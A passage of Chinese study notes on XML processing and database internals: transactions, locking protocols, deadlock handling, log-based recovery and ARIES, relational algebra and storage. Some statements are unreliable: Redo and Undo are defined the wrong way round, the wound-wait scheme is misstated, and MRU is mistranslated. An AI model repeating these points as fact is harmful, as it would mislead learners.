<ul>
<li>XSLT：一种用于转换 XML 文档的语言。</li>
<li>XPath：一种用于在 XML 文档中导航的语言。</li>
<li>XSL-FO：一种用于格式化 XML 文档的语言。</li>
</ul>
<p>这个是用来转换的。什么意思呢？比如从XML转换成HTML，或者从一个XML转换成另一个XML。</p>
<p>XSLT Templates，也是一个XML文档。</p>
<pre><code class="language-xml">&lt;xsl:template match=&quot;/bank-2/customer&quot;&gt;
    &lt;custom&gt;
        &lt;xsl:value-of select=&quot;customer_name&quot;/&gt;
    &lt;/custom&gt;
&lt;/xsl:template&gt;
&lt;xsl:template match=&quot;*&quot;/&gt;

</code></pre>
<p>xsl:template ：用XPath来匹配一些节点</p>
<p>xsl:value-of ：标签的内容</p>
<h2 id="api-1"><a class="header" href="#api-1">API</a></h2>
<p>SAX: Simple API for XML。基本的XML解析器。</p>
<p>DOM: Document Object Model。这个是常用的，给我们提供一系列函数来操作文档树。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-事务"><a class="header" href="#database-事务">Database-事务</a></h1>
<p>DBMS比起文件系统，有下面的优势。这些优势的实现离不开<strong>事务(Transaction)</strong>。或者说这些就是事务的特点：</p>
<p>并发：<strong>Concurrent executions</strong> of multiple users or multi-programs. 
可恢复：Failures of various kinds, such as hardware failures and system crashes.</p>
<!-- more -->
<h2 id="事务"><a class="header" href="#事务">事务</a></h2>
<p>事务的特性：</p>
<ul>
<li>
<p><strong>Atomicity (原子性)</strong>.  Either all operations of the transaction are properly reflected in the database or none are.   (responsibility of transaction-management component, also recovery-management component)</p>
<p>也就是说，事务要么被执行要么不被执行。无论事务本身是否发生错误，或者计算机发生错误。</p>
</li>
<li>
<p><strong>Isolation (隔离性)</strong>.  Although multiple transactions may execute concurrently, each transaction must be unaware of other concurrently executing transactions.  Intermediate transaction results must be hidden from other concurrently executed transactions. (responsibility of concurrency-control component) </p>
<p>尽管事务是并发执行的，但是对任何一个事务来说他都是独立执行的，对他来说其他事务要么在他之前执行，要么在他之后执行。在后面的<strong>并发控制系统</strong>会介绍。</p>
</li>
<li>
<p><strong>Consistency (一致性)</strong>.  Execution of a transaction in isolation preserves the consistency of the database.  (the duty of application programmer)</p>
</li>
<li>
<p><strong>Durability (持久性)</strong>.  After a transaction completes successfully, the changes it has made to the database persist, even if there are system failures. (responsibility of recovery-management component)</p>
<p>即使操作系统崩溃了甚至硬盘坏了（我们有一个理想的stable storage是永远有效的存储设备，比如RAID磁盘阵列，我们认为他是不会坏的），事务造成的影响也应该是持久的。在后面的<strong>恢复系统</strong>会介绍。</p>
</li>
</ul>
<h3 id="事务的原子性和持久性"><a class="header" href="#事务的原子性和持久性">事务的原子性和持久性</a></h3>
<ul>
<li>Active, the initial state; the transaction stays in this state while it is executing.</li>
<li>Partially committed, after the final statement has been executed.</li>
<li>Failed, after the discovery that normal execution can no longer proceed.</li>
<li>Aborted, after the transaction has been rolled back and the <u>database has been restored to its state prior to the start of the transaction.</u></li>
<li>Committed, after successful completion.</li>
</ul>
<p><img src="Basic/Database/../images/image-20210527154701853.png" alt="image-20210527154701853" /></p>
<h3 id="事务的隔离性"><a class="header" href="#事务的隔离性">事务的隔离性</a></h3>
<p>如果事务<strong>串行serially</strong>发生我们就不用考虑隔离性。但是为了性能考虑事务往往是<strong>并发concurrency</strong>的。</p>
<p>我们通过调度让并发在某种程度上等价于一个串行调度，叫做可串行化。</p>
<p>当I和J是不同事务在相同数据项上做至少有一个write操作时，我们认为I和J是<strong>冲突conflict</strong>的。</p>
<p><strong>冲突等价</strong>：如果调度S可以通过一系列非冲突指令交换转换成S‘，那么我们称S和S'是冲突等价的。所以若调度S和一个串行调度冲突等价，我们称S是<strong>冲突可串行化</strong>的。串行调度不是唯一的。</p>
<p>我们通过<strong>优先图precedence graph</strong>来检测调度是否冲突可串行化。</p>
<blockquote>
<p>This graph consists of a pair G = (V, E), where V is a set of vertices and E is a set of edges. The set of vertices consists of all the
transactions participating in the schedule. The set of edges consists of all edges Ti → Tj for which one of three conditions holds:</p>
<ol>
<li>Ti executes write(Q) before Tj executes read(Q). （也就是说，Ti应该先写了，Tj再读，Ti应该在Tj之前执行）</li>
<li>Ti executes read(Q) before Tj executes write(Q). （也就是说，Ti应该先读了，Tj再写，Ti应该在Tj之前执行）</li>
<li>Ti executes write(Q) before Tj executes write(Q). （也就是说，最后留下的应该是Tj写的结果，Ti应该在Tj之前执行）</li>
</ol>
<p>然后如果我们得到的图有环，那么就有不可串行化，反之可以<code>Ti-&gt;Tj</code>说明Ti应该在Tj之前执行。判断环和求顺序，都可以用拓扑排序。</p>
</blockquote>
<p>还有<strong>视图可串行化</strong>和<strong>视图等价</strong>的概念。</p>
<ul>
<li>Recoverable schedule：对Ti和Tj，如果Tj读取了Ti之前写过的数据，那么Tj应该在Ti commit之后再commit。因为Ti中间可能遇到故障roll back。</li>
<li>Cascaddeless schedule：一个更强的可恢复调度。简单的Recoverable schedule可能会像多米诺骨牌一样回滚。对Ti和Tj，如果Tj需要读取Ti写的数据，那么Tj应该在Ti commit之后再读取。</li>
</ul>
<h3 id="recover"><a class="header" href="#recover">Recover</a></h3>
<h2 id="并发系统"><a class="header" href="#并发系统">并发系统</a></h2>
<p>并发导致竞争，产生问题。</p>
<p><img src="Basic/Database/../images/image-20210527110120859.png" alt="image-20210527110120859" /></p>
<p>上面介绍了如何判断事务是否可串行化，但是我们不可能枚举每一种情况然后再去判断。我们有以下这些并发控制的方法。</p>
<p>锁：</p>
<ol>
<li>exclusive (X, 排它锁) mode. Data item can be both <strong>read as well as written</strong>. X-lock is requested using  lock-X instruction .</li>
<li>shared (S, 共享锁) mode. Data item can only be <strong>read</strong>. S-lock is  requested using  lock-S instruction</li>
</ol>
<p><strong>只要一个事务还在访问数据项，他就必须拥有该数据项上的锁。</strong></p>
<h3 id="two-phase-locking-protocol"><a class="header" href="#two-phase-locking-protocol">Two-Phase Locking Protocol</a></h3>
<p>每个事务分两个阶段提出加锁和解锁申请</p>
<ol>
<li>增长阶段(growing phase)：事务可以获得锁，但不能释放锁。</li>
<li>缩减阶段(shrinking phase)：事务可以释放锁，但不能获得锁。</li>
</ol>
<p>我们称最后加锁的位置（增长阶段的结束）为<strong>Lock point</strong>。多个事务根据他们的Lock point进行排序，得到的顺序就是事务的一个可串行化顺序。它可以保证得到的调度是冲突可串的，但是不保证不会产生死锁，需要通过别的方法保证死锁不出现。</p>
<p><img src="Basic/Database/../images/image-20210605200706697.png" alt="两阶段封锁协议冲突可串行化的证明" /></p>
<p>Strict Two-Phase Locking Protocol: 要求事务的排他锁在事务提交之后才可以释放。这样可以放置出现级联回滚。降低并发性。</p>
<p>Rigorous Two-Phase Locking Protocol: 要求事务在提交之前不可以释放任何锁。降低并发性。</p>
<p>一个简单的机制：</p>
<ol>
<li>Ti进行<code>read(Q)</code>操作的时候，产生一个<code>lock-S(Q); read(Q)</code>指令。</li>
<li>Ti进行<code>write(Q)</code>操作的时候，检测Q上是否已经有Share lock，如果有<code>upgrate(Q); write(Q)</code>。如果没有，产生一个<code>lock-X(Q); write(Q)</code>操作。</li>
<li>事务提交或者终止之后，释放所有的锁。</li>
</ol>
<h3 id="graph-based-protocol"><a class="header" href="#graph-based-protocol">Graph based protocol</a></h3>
<blockquote>
<p>To acquire such prior knowledge, we impose a partial ordering → on the set D = {d1, d2,..., dh} of all data items. If di → dj , then any transaction accessing both di and dj must access di before accessing dj . Only lock-X</p>
<ol>
<li>Ti的首次加锁可以对任何数据项进行</li>
<li>此后，Ti对Q加锁的前提是Ti持有Q的父项上的锁</li>
<li>对数据项的解锁可以随时进行</li>
<li>数据项被Ti加锁并解锁之后，Ti不能对该数据项加锁</li>
</ol>
</blockquote>
<p>与两阶段封锁协议相比，他不会产生死锁。</p>
<p><img src="Basic/Database/../images/image-20210630211409773.png" alt="image-20210630211409773" /></p>
<h3 id="多粒度和意向锁"><a class="header" href="#多粒度和意向锁">多粒度和意向锁</a></h3>
<p>有时候我们可能需要封锁整个数据表或者数据库，这时候如果我们一个一个数据加锁代价是不能接受的。所以我们出现了允许系统定义Multiple Granularity的锁的机制。我们的锁可以形成一个树形结构：</p>
<p><img src="Basic/Database/../images/image-20210603112314523.png" alt="image-20210603112314523" /></p>
<p>这样我们如果要封锁整个数据库，就可以直接在DB上加锁。但是这样我们不是还要遍历整个树看看叶节点有没有加锁吗？代价不能接受！所以我们引入<strong>意向锁intention lock</strong>。举个例子，比如如果我们要在Fa加上排他锁X，那么我们应该在A1和DB上都加上意向锁IX。</p>
<center>X：排他锁，S：共享锁；IX：意向排他锁；IS意向共享锁；SIX：S+IX。锁的兼容性</center>
<p><img src="Basic/Database/../images/image-20210603112835950.png" alt="image-20210603112835950" /></p>
<p>这样，加锁需要自顶向下遍历，释放需要自底向上遍历。规则：</p>
<ol>
<li>事务T必须遵守上面的锁类型相容函数。</li>
<li>事务T必须首先封锁树的根节点（DB），并且可以加任意类型的锁。</li>
<li>仅当T对Q的父节点具有IX或IS锁时，T可以对节点Q加S或IS锁。</li>
<li>仅当T对Q的父节点具有IX或SIX锁时，T可以对节点加X，SIX，IX锁。</li>
<li>仅当T未曾对任何节点解锁时，T可以对节点加锁（也就是说T是两阶段的）。</li>
<li>仅当T当前不持有Q的子节点的锁时，T可以对Q解锁。</li>
</ol>
<p>可以很好的减小加锁的代价，书上说还可以提高并发性。</p>
<h3 id="死锁的处理或避免"><a class="header" href="#死锁的处理或避免">死锁的处理或避免</a></h3>
<p>死锁的处理有两种思路，一种是通过<strong>死锁预防</strong>，另一种是通过<strong>死锁检测和死锁恢复</strong>。</p>
<p>死锁检测：<strong>wait-for cycle</strong>。操作系统里学过，如果等待图出现了环，那么我们发现了死锁。需要选取事务从图中移除（回滚）来取消环。我们需要周期的检测是否有环的出现。</p>
<p>死锁恢复：最简单的办法是回滚一个或多个事务。回滚不一定要全部回滚，可以回滚到打破环的状态。另外要注意的是防止出现starve，这个可以通过记录事务的回滚数实现，然后优先选择回滚数较少的事务进行回滚。</p>
<p>死锁预防：</p>
<ol>
<li>
<p>对加锁请求进行排序，或者要求同时获得所有的锁来保证不会发生循环等待。</p>
<p>可以对数据项强加一个次序（比如树结构中的偏序），要求事务只能按照次序规定的顺序封锁数据项。</p>
</li>
<li>
<p>使用抢占和事务回滚。利用时间戳，给每一个事务分配一个time stamp（注意下面的办法有点像从死锁中恢复，但是其实下面的情况不一定有死锁产生，所以可能会造成不必要的回滚）</p>
<ol>
<li>wait die。如果Ti申请的数据被Tj持有，那么如果Ti的时间戳小于Tj（Ti比Tj老），允许Ti等待，否则Ti回滚。</li>
<li>wound wait。如果Ti申请的数据被Tj持有，那么如果Ti的时间戳大于Tj（Ti比Tj年轻），允许Ti等待，否则Ti回滚。</li>
</ol>
</li>
</ol>
<h2 id="恢复系统"><a class="header" href="#恢复系统">恢复系统</a></h2>
<p>事务具有原子性，我们要保证提交了的事务做的所有修改都反应在数据库中，如果事务回滚了不对数据库做任何修改。为此，我们在修改数据库本身之前，先向<strong>稳定存储器</strong>输出信息描述要做的修改，这就是所谓<strong>日志Log</strong>。</p>
<p>日志Log</p>
<h3 id="日志先写原则"><a class="header" href="#日志先写原则">日志先写原则</a></h3>
<p><strong>日志先写</strong>(Write-Ahead Log,WAL)原则，保证以下三点：</p>
<ol>
<li>Transaction Ti enters the commit state after the <code>&lt;Ti commit&gt;</code> log record has been output to stable storage.</li>
<li>Before the <code>&lt;Ti commit&gt;</code> log record can be output to stable storage, all log records pertaining to transaction Ti must have been output to stable storage.</li>
<li>Before a block of data in main memory can be output to the database (in nonvolatile storage), all log records pertaining to data in that block must have been output to stable storage.</li>
</ol>
<p>可以思考如果没有日志先写原则会发生什么，操作已经执行了但是没有写到日志里去，可能事务执行到一半崩溃了，我们就不会回滚那些没有写入日志的操作，原子性就被打破了。反之，只要日志先写了，就算操作没有执行日志写了，大不了Redo或者Undo。原子性都能得到保持。</p>
<p>为了满足日志先写原则，<strong>一个正在从主存转移到磁盘的缓冲块是不允许被更新的</strong>（这个是为什么？可能因为内存写的应该在日志写之前吧，毕竟快很多）。所以当一个缓存块要被输出到磁盘时，执行以下操作</p>
<ol>
<li>获得这个缓冲块B的排他锁，禁止被写入。</li>
<li>将日志记录输出到稳定存储器，直到和该缓冲块B相关的所有日志记录都被输出完成。</li>
<li>将该缓冲块B输出到磁盘</li>
<li>释放排他锁。</li>
</ol>
<p>因为这个排他锁和并发控制无关，并且短期持有，所以被叫做<strong>Latch</strong>。</p>
<h3 id="redo和undo"><a class="header" href="#redo和undo">Redo和Undo</a></h3>
<p>重做和撤销是恢复的基本操作。</p>
<ul>
<li>Redo使用一个日志记录，将日志中指明的数据项设置为旧值。</li>
<li>Undo使用一个日志记录，将日志中指明的数据项设置为新值。</li>
</ul>
<p>如果一个事务的<code>start</code>和<code>commit</code>都已经记录在日志了，那么这个事务应该要Redo。如果一个事务只有<code>start</code>在日志中而没有<code>commit</code>，那么这个事务应该要Undo。注意，日志中说一个事务commit了，他不一定真正写到磁盘了，因为日志先写，事务真正的修改可能还在缓存中。</p>
<p>注意，这里日志记录里的操作是<strong>幂等操作</strong>。什么意思呢？比如记录了<code>&lt;T0,A,100,150&gt;</code>的意思是A从100变成了150，记录的是绝对值而不是相对值<code>+50</code>这样我们才可以反复的Redo或者Undo而不会出现错误，和之前的并发系统是有所区别的。之后也会有非幂等操作应该怎么办。</p>
<h3 id="check-point"><a class="header" href="#check-point">Check point</a></h3>
<p>当系统故障发生的时候，我们需要检查日志决定哪些事务需要Redo哪些需要Undo，原则上需要检查所有的日志。所以为了提高效率，我们引入了Check point。</p>
<p>在Check point停止其他事务的执行，完成下面的任务：</p>
<ol>
<li>把主存中所有的Log输出到稳定存储器。</li>
<li>把所有的修改缓冲块输出到磁盘（磁盘不是稳定存储器，也是会坏的）。</li>
<li>将日志记录<code>&lt;checkpoint L&gt;</code>输出到稳定存储器，其中L是执行check point时active的事务列表。</li>
</ol>
<p>当系统崩溃发生的时候，我们只需要处理最后一个Check point（可以通过倒着查找完成）及之后发生的事情就OK了。也就是说，我们保证<strong>检查点之前的日志上记录的事情都被正确的完成了</strong>。我们在检查点的时候需要停止事务的一切更新工作，直到上面的事情完成。</p>
<p>为了避免停下等待，我们引入了<strong>fuzzy checkpoint</strong>。允许在check point写入日志之后，但是在修改过的缓冲块写道磁盘之前开始做更新。因此这个检查是不完全的，系统可能在中间崩溃。</p>
<h3 id="恢复算法"><a class="header" href="#恢复算法">恢复算法</a></h3>
<p><strong>事务回滚</strong>，考虑正常操作时候的事务回滚。</p>
<p>我们从后往前扫描日志，对每一条形如<code>&lt;Ti,Xj,V1,V2&gt;</code>的记录</p>
<ol>
<li>值V1被写到Xj中</li>
<li>往日志中写入一个特殊的只读日志<code>&lt;Ti,Xj,V1&gt;</code>。这被称为补偿日志记录(compensation log record)，我们不需要记录Undo信息，因为这样的操作不会被Undo。</li>
</ol>
<p>直到发现了<code>&lt;T1,start&gt;</code>，然后我们往日志中写一个<code>&lt;T1,abort&gt;</code>。</p>
<p><strong>数据库崩溃后的恢复（主存数据丢失）</strong>，分两个阶段进行：</p>
<ol>
<li>重做阶段：
<ol>
<li>从最后一个checkpoint向后扫描，将要回滚的事务的<code>undo-list</code>初始设置为<code>&lt;checkpoint L&gt;</code>日志记录的L。</li>
<li>一旦遇到<code>&lt;Ti,Xj,V1,V2&gt;</code>和<code>&lt;Ti,Xj,V1&gt;</code>就Redo一遍。</li>
<li>一旦发现<code>&lt;Ti,start&gt;</code>就加入<code>undo-list</code></li>
<li>一旦发现<code>&lt;Ti,abort&gt;</code>或者<code>&lt;Ti,commit&gt;</code>就从<code>undo-list</code>删除。</li>
</ol>
</li>
<li>撤销阶段：此时undo-list包括了崩溃前尚未完成的所有事务
<ol>
<li>从后向前扫描，一旦发现输入<code>undo-list</code>中的事务的日志记录，就执行undo操作</li>
<li>一旦发现<code>undo-list</code>中事务<code>Ti</code>的<code>&lt;Ti,start&gt;</code>，就往日志中写一个<code>&lt;Ti,abort&gt;</code>日志记录，并把<code>Ti</code>从<code>undo-list</code>中删除。</li>
<li>一旦<code>undo-list</code>为空，那么撤销阶段结束。</li>
</ol>
</li>
</ol>
<p><img src="Basic/Database/../images/image-20210610202007987.png" alt="image-20210610202007987" /></p>
<p><strong>非易失性存储器损坏</strong>。虽然这个时期发生的概率较小，但是他毕竟不是稳定存储器，我们还是要考虑他丢失的可能性。</p>
<p>基本的解决办法是周期的将整个数据库的内容dump到稳定存储器。比如一天一次。如果发生故障，先利用dump的数据，然后就只用利用日志恢复还没dump的一部分了。</p>
<h3 id="逻辑undo"><a class="header" href="#逻辑undo">逻辑undo</a></h3>
<p>目的（这里我没懂）：有时为了提高并发性，我们可以用采用非两阶段的方式提前释放锁。比如插入和删除操作都需要逻辑undo，因为他们提前释放锁。</p>
<p>逻辑日志，仅用于undo，不用于redo。</p>
<pre><code>&lt;Ti,Oj,operation-begin&gt;

&lt;Ti,Oj,operation-end,U&gt;
</code></pre>
<p>那么带有逻辑undo的事务回滚应该如何进行：</p>
<p>从后向前扫描：</p>
<ol>
<li>在扫描中遇到的physical log就像之前一样处理，除了下面要提到的</li>
<li>遇到<code>&lt;Ti,Oj,operation-end,U&gt;</code>标记的日志记录
<ol>
<li>就使用undo信息<code>U</code>来回滚该操作，在操作回滚的过程中，将执行的更新记入日志，回滚操作结束之后，产生一个<code>&lt;operation-abort&gt;</code>。</li>
<li>继续反向扫描的过程中，跳过事务<code>Ti</code>的所有日志记录，直到遇到<code>&lt;Ti,Oj,operation-begin&gt;</code>。</li>
</ol>
</li>
<li>如果遇到一个<code>&lt;operation-abort&gt;</code>，就跳过前面的所有记录直到遇到<code>&lt;Ti,Oj,operation-begin&gt;</code>。</li>
<li>遇到<code>&lt;Ti,start&gt;</code>回滚事务就完成了，添加一个<code>&lt;Ti,abort&gt;</code>。</li>
</ol>
<p><img src="Basic/Database/../images/image-20210611124734404.png" alt="image-20210611124734404" /></p>
<h3 id="aries算法star"><a class="header" href="#aries算法star">ARIES算法:star:</a></h3>
<p>有实用价值的算法。也比较复杂。论文原文：<a href="https://www.cs.berkeley.edu/~brewer/cs262/Aries.pdf">ARIES: A Transaction Recovery Method Supporting Fine-Granularity Locking and Partial Rollbacks Using Write-Ahead Logging</a>。下面仅是概览</p>
<h4 id="数据结构-3"><a class="header" href="#数据结构-3">数据结构</a></h4>
<p>ARIES中每个日志记录都有一个唯一标识该记录的log sequence number(LSN)。</p>
<p>每个页也维护一个PageLSN。每当一个更新操作发生在某个Page上时，该操作将其日志记录的LSN存储在该Page的PageLSN 域上。在恢复的撤销阶段，$LSN\le PageLSN$的日志记录将不在该页上执行，因为他的动作已经反映在该页上了。</p>
<p><strong>脏页表 DirtyPageTable</strong>包含一个在数据库缓冲区已更新的页的列表。它为每一个page保存一个PageLSN和一个RecLSN，其中ReCLSN用于标识已经实施于该page的磁盘上的版本的日志记录。</p>
<p><strong>检查点日志记录CheckPoint log record</strong>包含脏页表和活动事务的列表。检查点日志记录也为每个事务记录他的LastLSN，就是每个事务所写的最后一个日志记录的LSN。</p>
<p><img src="Basic/Database/../images/image-20210612143747598.png" alt="image-20210612143747598" /></p>
<h4 id="恢复算法-1"><a class="header" href="#恢复算法-1">恢复算法</a></h4>
<p>ARIES从系统崩溃中的恢复过程经历三个阶段</p>
<ol>
<li>analysis pass 这一阶段决定那些事务要撤销，那些页在崩溃时是脏的，重做阶段应该从哪个LSN开始。</li>
<li>redo pass 这一阶段从analysis pass决定的位置开始，执行redo，重复历史。</li>
<li>undo pass 这一阶段回滚在崩溃时发生的不完全的事务。</li>
</ol>
<p>analysis pass: 从Check Point开始正向扫描</p>
<ol>
<li>找到最后的完整的Check Point，从该记录读入Dirty Page Table</li>
<li>将<strong>RedoLSN</strong>设置为Dirty Page Table中RecLSN的最小值</li>
<li>将UndoList设置为日志记录中的事务列表，向后扫描的过程中发现commit/abort等就把事务从UndoList中删除；发现begin就把事务添加入UndoList</li>
<li>The analysis pass also updates DirtyPageTable whenever it finds a log record
for an update on a page. If the page is not in DirtyPageTable, the analysis pass
adds it to DirtyPageTable, and sets the RecLSN of the page to the LSN of the log
record.</li>
</ol>
<p>redo pass: 从RedoLSN开始正向扫描，如果找到更新日志记录才执行操作</p>
<ol>
<li>如果该页不再Dirty Page Table中，或者该更新日志记录的LSN小于脏页表中该页的RecLSN，跳过该日志记录。</li>
<li>否则从磁盘中调出该页，如果该页的PageLSN小于Dirty Page Table中的RecLSN，就重做该日志记录。</li>
</ol>
<p>undo pass: 反向扫描，直到Undo list空了为止</p>
<p>​	</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-关系代数"><a class="header" href="#database-关系代数">Database-关系代数</a></h1>
<h2 id="关系代数"><a class="header" href="#关系代数">关系代数</a></h2>
<p>严谨的定义看书。
六个基本运算：</p>
<ul>
<li>Select 选择：返回输入关系中满足谓词的行。可以认为是选择行。用 $\sigma$ 表示。</li>
<li>Project 投影：对输入关系所有的行输出指定的属性。从输出中除去重复行。可以认为是选择列。用 $\prod$ 表示。</li>
<li>Union 并：输出两个关系中元组的并，用$r \cup s$表示。要求
<ul>
<li>等目，同元，即他们的属性数目必须相同</li>
<li>对任意i，r的第i个属性域和s的第i个属性域相同</li>
</ul>
</li>
<li>set difference 差（集合差）：r-s就是把s中出现的tuple从r中移出。需要满足的条件和Union相同。</li>
<li>Cartesian product 笛卡儿积：从两个关系中输出所有的元组对，无论他们在共同属性上的取值是否相同。用$\times$表示。</li>
<li>Rename 更名（重命名）：用 $\rho$ 表示。</li>
</ul>
<p>附加运算，都可以用基本运算表示：</p>
<ul>
<li>Set intersection 交：$r \cap s = r-(r-s)$</li>
<li>Natural join 自然连接：从两个关系中输出所有在<strong>共同属性上的取值相同的元组对。</strong> 用 $\bowtie$ 表示，非常好用。有一种特殊情况，如果$R \Join S$而两个relation没有相同的属性的话，$R \Join S = R \times S$。另外还有theta连接，$R \Join_\theta S = \sigma_\theta (R\times S)$.</li>
<li>Division 除：$r \div s = { t|t\in \prod_{R-S}(r)\  and\   \forall u\in s(tu\in r)}$ 。如果要用基本运算表示，可以是：。用自然语言表示，就是找出满足r中包含所有s的r-s。“查询…<strong>全部的/所有的</strong>…&quot;，就要想到除运算。</li>
<li>Assignment 赋值：通过给临时关系变量复制的方法来写关系代数表达式会很方便，用$\gets$符号表示。$temp1 \gets R \times S$。</li>
</ul>
<p>总结：</p>
<ul>
<li>并、差、交为双目、等元运算 </li>
<li>笛卡尔积，自然连接，除为双目运算</li>
<li>投影、选择为单运算对象</li>
<li>关系运算的优先级： 
<ul>
<li>投影</li>
<li>选择</li>
<li>笛卡尔积</li>
<li>连接、除</li>
<li>交</li>
<li>并、差</li>
</ul>
</li>
</ul>
<p>扩展关系代数运算：都是非常有用的运算</p>
<ul>
<li>
<p>Generalize projection：允许在投影列表中使用算术函数来对投影操作进行扩展</p>
</li>
<li>
<p>Aggregate function（聚合函数）：输入一堆值，输出一个值。</p>
<ul>
<li><img src="Basic/Database/../images/1615616631796.jpg" alt="" />前面的是分组规则，后面的是聚合函数。</li>
<li>sum,max,min,count,</li>
</ul>
</li>
<li>
<p>Outer join：自然连接把无法匹配上的tuple丢弃了。但是有时候，我们可能想保留那些对不上的tuple。但是这样在另一张表找不到对应的记录，我们就用null来填充。</p>
</li>
</ul>
<p>删除：$r \leftarrow r – E$
插入：$r \leftarrow r\cup E$</p>
<center>SQL和关系代数对照</center>
<div class="table-wrapper"><table><thead><tr><th>关系代数</th><th>比较相似的SQL</th></tr></thead><tbody>
<tr><td>Project 投影</td><td>select + distinct</td></tr>
<tr><td>Select 选择</td><td>select + where</td></tr>
<tr><td>Union 并集</td><td>union</td></tr>
<tr><td>different 差集</td><td>except</td></tr>
<tr><td>笛卡尔积</td><td>select * from A,B</td></tr>
<tr><td>rename 重命名</td><td>as</td></tr>
<tr><td>intersection 交集</td><td>intersection</td></tr>
<tr><td>自然连接</td><td>join比他更强大</td></tr>
<tr><td>theta 连接</td><td>join + having 比他更强大</td></tr>
<tr><td>divition 除</td><td>见下</td></tr>
<tr><td>赋值运算</td><td>select into</td></tr>
<tr><td>聚合函数</td><td>聚合函数+group by</td></tr>
<tr><td>Outer join</td><td>SQL中的full outer join, right outer join ,left outer join</td></tr>
<tr><td>Generalize projection</td><td>在SQL中很方便，就是在select后面添加表达式</td></tr>
</tbody></table>
</div>
<pre><code class="language-sql">-- B div A =&gt;
SELECT * FROM B
WHERE NOT EXISTS(
	SELECT * FROM A
	WHERE NOT EXISTS(
		-- 用中间表将A,B连接起来
		SELECT * FROM 中间表
		WHERE 中间表.key1 = A.key AND 中间表.key2 = B.key
	)
)
/*
版权声明：本文为CSDN博主「一个不想写代码的程序员」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_36979214/article/details/105993194
*/
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-存储和查询"><a class="header" href="#database-存储和查询">Database-存储和查询</a></h1>
<p>数据库管理系统主要有两个部分，一个是<strong>查询</strong>，一个是<strong>存储</strong>。</p>
<ul>
<li>Query processor
<ul>
<li>Parsing and translation</li>
<li>Optimization</li>
<li>Evaluation (Execution)</li>
</ul>
</li>
<li>Storage manager
<ul>
<li>File manager</li>
<li>Buffer manager</li>
<li>Transaction manager</li>
<li>Authorization and integrity manager</li>
</ul>
</li>
</ul>
<h2 id="storage-1"><a class="header" href="#storage-1">Storage</a></h2>
<p>volatile storage: 比如 SDR DDR</p>
<p>non-volatile storage：比如我们的磁盘、SSD，还有一种带电池的main-memory</p>
<p>速度/大小： Cache =&gt; Main memory =&gt; Flash disk(固态硬盘)=&gt; Magnetic disk =&gt; Optical storage(光盘) =&gt; Tape storage</p>
<p>前面两个是primary storage，中间两个是online storage，后面两个一般都是用来备份的，称为offline storage。</p>
<h3 id="disk"><a class="header" href="#disk">Disk</a></h3>
<p>磁盘的物理结构不介绍了，看书吧。</p>
<p><strong>Disk Controller</strong> ：是计算机系统和实际的磁盘驱动器硬件之间的接口。他结构高层次的读写扇区的命令，然后开始操作物理设备比如移动磁头。还有一个任务是<strong>remapping of bad sector</strong>把坏扇区在逻辑上映射到另一个物理位置。</p>
<p>磁盘通过一个高速互连通道连接到计算机系统。常用的接口有</p>
<ol>
<li>SATA(Serial ATA)。</li>
<li>SCSI(Small computer system interconnect)</li>
<li>SAS(Serial attached SCSI)</li>
</ol>
<p><strong>衡量指标：</strong></p>
<p>access time = seek time + rorational latency time.</p>
<p>data-tansfer rate 数据传输率</p>
<p>一个很重要的指标是MTTF(Mean time to failure，平均故障时间)一般是3到5年。</p>
<p><strong>有以下优化的方式</strong>：</p>
<ol>
<li>block。增大block的大小，一次多读一点</li>
<li>调度算法。</li>
<li>磁盘碎片整理。让文件最好集中在一起。</li>
<li>buffer。通过增加一层non-volatile RAM或者flash memory。</li>
<li>Log disk。针对数据库系统需要频繁的写日志，所以专门分配一块写日志的磁盘。平时都是sequential write。</li>
</ol>
<h3 id="raid"><a class="header" href="#raid">RAID*</a></h3>
<p>操作系统学过。</p>
<h2 id="file-manage"><a class="header" href="#file-manage">File Manage</a></h2>
<h3 id="fixed-length-records"><a class="header" href="#fixed-length-records">fixed-length records</a></h3>
<p>一个一个记录顺序排列下来。这样非常简单。</p>
<p>一个问题是，如果block大小和记录大小没有倍数关系的话，那么我们不能让记录横跨两个block，最后不足以容纳一个记录的时候要存到下一个Block中。</p>
<p>查找很方便，但是插入删除就不一定了。</p>
<p>删除可以把最后一条记录覆盖被删除的记录，但是你的内容如果是<strong>有序的排列</strong>的话，就不好使了。插入也是类似的对有序内容效率低下。</p>
<p>删除可以还使用“惰性删除”的办法，用一个free list指向被删除的记录，之后插入的时候在把它用了。</p>
<p>如果是有序排列的话，可以定期的重新排列一次。</p>
<h3 id="variable-length-records"><a class="header" href="#variable-length-records">Variable-Length Records</a></h3>
<p>比如变长数组，变长字符串，二进制文件。</p>
<p>一个简单的办法是记录metadata{location, size}，用来指向真正的Records内容。</p>
<p>删除的话还是要移动Records，让Free Space连续。</p>
<p><img src="Basic/Database/../images/image-20210506110601916.png" alt="image-20210506110601916" /></p>
<h3 id="relation"><a class="header" href="#relation">Relation</a></h3>
<p>Relation是很多Record的集合。Relation怎么组织：</p>
<ul>
<li>Heap file (堆文件, 流水文件) – a record can be placed anywhere in the file where there is space</li>
<li>Sequential file (顺序文件) – store records in sequential order, based on the value of a <strong>search key</strong> of each record</li>
<li>Hashing file (散列文件) – a hash function computed on some attribute of each record; the result specifies in which block of the file the record should be placed</li>
<li>Clustering file organization (聚集文件组织) – records of several different relations can be stored in the same file
Motivation: store related records in different relations on the same block to minimize I/O</li>
</ul>
<p>metadata存在哪里（比如User信息，Relation信息）。一个办法就是存在表里，和普通数据一样。</p>
<p>buffer</p>
<blockquote>
<p>If the block is already in the buffer, the requesting program is given the address of the block in main memory
If the block is not in the buffer,</p>
<ol>
<li>The buffer manager allocates free space in the buffer for the block, replacing (throwing out) some old pages, if no free spaces, to make space for the new block. (在buffer中为新页分配空间)</li>
<li>The block that is thrown out is written back to disk only if it was modified since the most recent time that it was written to/fetched from the disk. (将被覆盖的旧块若已被修改过，则写回磁盘)</li>
<li>Once space is allocated in the buffer, the buffer manager reads the block from the disk to the buffer, and passes the address of the block in main memory to requester. (从磁盘读入新块放buffer)</li>
</ol>
</blockquote>
<p>Buffer-Replacement Policies: LRU (最近最少使用), MRU (最近最常使用)</p>
<h2 id="index-1"><a class="header" href="#index-1">Index</a></h2>
<p>索引能极大的加速访问。一般有两种</p>
<ul>
<li>Ordered indices (顺序索引):  search keys (index entries) are stored in sorted order</li>
